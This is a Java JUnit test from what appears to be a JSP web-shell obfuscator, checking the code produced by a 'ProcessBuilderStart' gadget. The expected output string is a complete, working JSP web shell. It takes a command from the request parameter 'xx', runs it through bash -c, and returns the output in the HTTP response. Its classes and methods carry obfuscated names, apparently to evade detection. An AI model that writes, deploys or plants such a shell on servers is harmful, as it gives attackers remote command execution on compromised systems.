package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContext;
import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContextAdapter;
import com.t3stzer0.jspobfuscator.api.plugin.gadget.GadgetExtension;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

class ProcessBuilderStartTest {
  @Test
  void testGetCode() {
    GadgetExtension ext = new ProcessBuilderStart();
    ExtensionContextAdapter ctx = new ExtensionContextAdapter();
    ext.initExtension(ctx);
    ctx.setStringInput("CommandParameter", "xx");
    List<String> code = ext.getCode(ctx);
    assertNotNull(code);
    assertEquals(1, code.size());
    String expectCode =
"""
try {
    final String cmd = request.getParameter("xx");
    class WmA {
        Ah rn8;
        class Ah {
            private Process process;
            public Ah() throws IOException {
                process = new ProcessBuilder().command("bash", "-c", cmd).start();
            }
        }
        public WmA() throws IOException {
            rn8 = new Ah();
        }
        public String d3A() throws IOException {
            Process process = rn8.process;
            InputStream inputStream = process.getInputStream();
            StringBuilder stringBuilder = new StringBuilder();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line).append("\\n");
            }
            return stringBuilder.toString();
        }
    }
    response.getOutputStream().write(new WmA().d3A().getBytes());
} catch (Exception e) {
    e.printStackTrace();
}
""";
    assertEquals(expectCode, code.get(0));
  }
}
